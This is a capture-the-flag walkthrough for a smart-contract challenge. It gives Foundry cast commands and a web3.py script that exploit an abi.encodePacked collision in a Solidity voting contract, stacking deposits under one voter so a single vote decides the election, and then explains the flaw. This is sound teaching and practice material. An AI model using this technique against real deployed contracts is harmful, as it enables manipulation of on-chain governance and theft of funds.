# NotADemocraticElection - Complete Walkthrough

## Quick Start (What You Need To Do)

### Step 1: Get Your Instance Info
```bash
nc 94.237.62.103 34182
```

When you connect, you'll see a menu. Press **1** and you'll get:
- Your private key (64 hex characters)
- Setup contract address
- Target contract address  
- RPC endpoint URL

**Copy these values!**

### Step 2: Run the Exploit

#### Option A: Using Foundry (cast) - RECOMMENDED

```bash
# Set your values
export PRIVATE_KEY="YOUR_PRIVATE_KEY_FROM_STEP_1"
export TARGET="YOUR_TARGET_ADDRESS_FROM_STEP_1"
export RPC="http://94.237.62.103:52380"

# Execute the exploit
# 1. Deposit 500 ETH as ("A", "B")
cast send $TARGET "depositVoteCollateral(string,string)" "A" "B" \
  --value 500ether --private-key $PRIVATE_KEY --rpc-url $RPC

# 2. Deposit 500 ETH as ("AB", "") - bypasses uniqueness, same voterSig!
cast send $TARGET "depositVoteCollateral(string,string)" "AB" "" \
  --value 500ether --private-key $PRIVATE_KEY --rpc-url $RPC

# 3. Vote for CIM - gets 1000 ETH weight from accumulated deposits
cast send $TARGET "vote(bytes3,string,string)" \
  0x43494d0000000000000000000000000000000000000000000000000000000000 \
  "A" "B" \
  --private-key $PRIVATE_KEY --rpc-url $RPC

# 4. Verify CIM won
cast call $TARGET "winner()(bytes3)" --rpc-url $RPC
# Should return: 0x43494d0000000000000000000000000000000000000000000000000000000000 (CIM)
```

#### Option B: Manual with web3.py

```python
from web3 import Web3

# Connect
w3 = Web3(Web3.HTTPProvider('http://94.237.62.103:52380'))
account = w3.eth.account.from_key('YOUR_PRIVATE_KEY')

# Contract setup
target = 'YOUR_TARGET_ADDRESS'
abi = [...] # See exploit.py for full ABI

contract = w3.eth.contract(address=target, abi=abi)

# Execute exploit
# 1. Deposit as ("A", "B")
tx1 = contract.functions.depositVoteCollateral("A", "B").build_transaction({
    'from': account.address,
    'value': w3.to_wei(500, 'ether'),
    'nonce': w3.eth.get_transaction_count(account.address),
    'gas': 200000,
    'gasPrice': w3.eth.gas_price
})
signed1 = account.sign_transaction(tx1)
w3.eth.send_raw_transaction(signed1.rawTransaction)
w3.eth.wait_for_transaction_receipt(signed1.hash)

# 2. Deposit as ("AB", "")
tx2 = contract.functions.depositVoteCollateral("AB", "").build_transaction({
    'from': account.address,
    'value': w3.to_wei(500, 'ether'),
    'nonce': w3.eth.get_transaction_count(account.address),
    'gas': 200000,
    'gasPrice': w3.eth.gas_price
})
signed2 = account.sign_transaction(tx2)
w3.eth.send_raw_transaction(signed2.rawTransaction)
w3.eth.wait_for_transaction_receipt(signed2.hash)

# 3. Vote for CIM
tx3 = contract.functions.vote(b"CIM", "A", "B").build_transaction({
    'from': account.address,
    'nonce': w3.eth.get_transaction_count(account.address),
    'gas': 200000,
    'gasPrice': w3.eth.gas_price
})
signed3 = account.sign_transaction(tx3)
w3.eth.send_raw_transaction(signed3.rawTransaction)
w3.eth.wait_for_transaction_receipt(signed3.hash)

print("CIM wins! Winner:", contract.functions.winner().call())
```

### Step 3: Get Your Flag

```bash
nc 94.237.62.103 34182
```

Press **3** to get the flag!

---

## Why This Works

### The Vulnerability

The contract checks voter uniqueness with:
```solidity
mapping(string => mapping(string => address)) uniqueVoters;
require(uniqueVoters[_name][_surname] == address(0));
```

But stores voter weight with:
```solidity
mapping(bytes => Voter) voters;
bytes memory voterSig = abi.encodePacked(_name, _surname);
voters[voterSig].weight += msg.value;
```

### The Problem

`abi.encodePacked()` concatenates without delimiters:
- `abi.encodePacked("A", "B")` → `"AB"`
- `abi.encodePacked("AB", "")` → `"AB"`

These are **DIFFERENT** in `uniqueVoters` but **IDENTICAL** in `voters`!

### The Exploit Flow

```
1. depositVoteCollateral("A", "B") with 500 ETH
   ✓ uniqueVoters["A"]["B"] = your_address
   ✓ voters["AB"].weight = 500 ETH

2. depositVoteCollateral("AB", "") with 500 ETH
   ✓ uniqueVoters["AB"][""] = your_address (different key!)
   ✓ voters["AB"].weight = 1000 ETH (same key!)

3. vote("CIM", "A", "B")
   ✓ Checks: uniqueVoters["A"]["B"] == your_address ✓
   ✓ Gets weight: voters["AB"].weight = 1000 ETH
   ✓ Adds 1 * 1000 ETH to CIM's votes
   ✓ CIM total = 1000 ETH >= 1000 ETH target
   ✓ CIM WINS! 🎉
```

---

## Troubleshooting

### "Docker not running"
- Go to the CTF platform
- Click the restart/spawn button for the challenge
- Wait for the new IP/ports

### "Transaction failed"
- Check you have enough ETH in your account
- The challenge gives you 1000+ ETH to start
- Verify the contract addresses are correct

### "Already deposited"
- Make sure you're using different name/surname pairs
- ("A", "B") and ("AB", "") must be different
- Don't reuse the same combination twice

### "Not enough votes"
- Ensure both deposits went through
- Check balances: `cast call $TARGET "getVotesCount(bytes3)(uint256)" 0x43494d00...`

---

## Files in This Directory

- `SOLUTION.md` - Detailed explanation of the vulnerability
- `Exploit.sol` - Solidity exploit contract
- `exploit.py` - Python exploitation script
- `auto_exploit.py` - Interactive Python script
- `quick_exploit.sh` - Bash script with cast commands
- `solve.sh` - Explanation script
- `THIS_FILE.md` - Complete walkthrough (you are here)

---

## Flag Format

The flag should look like: `HTB{...}`

Once you get it, submit it on the CTF platform!

Good luck! 🚀
